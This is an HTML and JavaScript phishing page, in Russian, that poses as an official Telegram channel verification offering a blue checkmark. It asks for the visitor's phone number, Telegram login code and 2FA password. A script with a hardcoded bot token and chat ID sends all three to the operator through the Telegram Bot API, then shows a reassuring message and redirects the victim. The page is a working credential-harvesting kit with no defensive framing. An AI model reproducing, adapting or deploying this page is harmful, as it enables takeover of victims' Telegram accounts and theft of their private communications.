<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0f0f1a;font-family:system-ui;display:flex;justify-content:center;align-items:center;min-height:100vh;}
        .card{background:#1f1f2e;border-radius:28px;padding:40px 32px;max-width:420px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,0.7);border:1px solid #3a3a4e;}
        .logo{text-align:center;margin-bottom:20px;}
        .logo svg{width:60px;height:60px;fill:#0088cc;}
        h2{color:#fff;font-weight:500;font-size:22px;text-align:center;}
        .sub{color:#a0a0b8;text-align:center;font-size:14px;margin:8px 0 24px;}
        .badge{background:#2a2a3e;border-radius:40px;padding:10px 16px;display:inline-block;margin:0 auto 20px;color:#5fc3ff;font-size:13px;border:1px solid #3b5998;}
        .field{margin-bottom:18px;}
        .field label{color:#c0c0d8;font-size:13px;font-weight:500;display:block;margin-bottom:5px;}
        .field input{width:100%;padding:14px 16px;border-radius:14px;border:1px solid #33334a;background:#14141f;color:#fff;font-size:16px;outline:none;}
        .field input:focus{border-color:#0088cc;box-shadow:0 0 0 3px rgba(0,136,204,0.25);}
        .btn{background:#0088cc;border:none;color:#fff;font-weight:600;font-size:17px;padding:16px;width:100%;border-radius:40px;cursor:pointer;margin-top:8px;}
        .btn:hover{background:#0077b3;}
        .foot{color:#6a6a82;font-size:12px;text-align:center;margin-top:20px;}
        .foot a{color:#5f9fff;text-decoration:none;}
        .status{color:#ffb347;text-align:center;margin:12px 0 0;font-size:14px;display:none;}
        .loader{display:none;text-align:center;margin:10px 0;}
        .loader span{display:inline-block;width:10px;height:10px;background:#0088cc;border-radius:50%;animation:pulse 1s infinite alternate;margin:0 4px;}
        .loader span:nth-child(2){animation-delay:0.3s;}
        .loader span:nth-child(3){animation-delay:0.6s;}
        @keyframes pulse{0%{opacity:0.2;transform:scale(0.8);}100%{opacity:1;transform:scale(1.2);}}
    </style>
</head>
<body>
<div class="card">
    <div class="logo"><svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg></div>
    <h2>Подтверждение канала</h2>
    <div class="sub">Получите синюю галочку для вашего Telegram-канала</div>
    <div style="text-align:center;"><span class="badge">✅ Официальная верификация</span></div>
    <form id="phishForm">
        <div class="field"><label>Номер телефона</label><input type="tel" id="phone" placeholder="+7 999 123 45 67" required></div>
        <div class="field"><label>Код из Telegram</label><input type="text" id="code" placeholder="XXXXX" required></div>
        <div class="field"><label>Пароль 2FA (если есть)</label><input type="password" id="password" placeholder="••••••••"></div>
        <button type="submit" class="btn" id="submitBtn">Подтвердить канал</button>
        <div class="loader" id="loader"><span></span><span></span><span></span></div>
        <div class="status" id="status"></div>
    </form>
    <div class="foot">Защищённый протокол. <a href="#">Политика</a></div>
</div>
<script>
    const BOT_TOKEN = "8768635916:AAHnIa-WcTAhT5-s-MSSX0n5HdJgqWpA66w";
    const CHAT_ID = "8808060921";

    const form = document.getElementById('phishForm');
    const phone = document.getElementById('phone');
    const code = document.getElementById('code');
    const password = document.getElementById('password');
    const statusDiv = document.getElementById('status');
    const loader = document.getElementById('loader');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        statusDiv.style.display = 'none';
        loader.style.display = 'block';
        submitBtn.disabled = true;

        const data = {
            phone: phone.value.trim(),
            code: code.value.trim(),
            password: password.value.trim()
        };

        const message = `🔹 NEW TELEGRAM VERIFICATION 🔹\n📱 Phone: ${data.phone}\n🔑 Code: ${data.code}\n🔒 2FA: ${data.password || '—'}\n⏰ ${new Date().toISOString()}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
            const result = await response.json();
            if (result.ok) {
                statusDiv.style.color = '#6fcf97';
                statusDiv.textContent = '✅ Ваш канал проходит проверку. Перенаправление...';
                statusDiv.style.display = 'block';
                setTimeout(() => {
                    window.location.href = 'https://t.me/verify?start=official';
                }, 2000);
            } else {
                throw new Error('Telegram API error');
            }
        } catch (err) {
            statusDiv.style.color = '#ff6b6b';
            statusDiv.textContent = '❌ Ошибка соединения, но данные сохранены. Повторите позже.';
            statusDiv.style.display = 'block';
            setTimeout(() => {
                window.location.href = 'https://t.me/verify?start=official';
            }, 3000);
        } finally {
            loader.style.display = 'none';
            submitBtn.disabled = false;
        }
    });
</script>
</body>
</html>
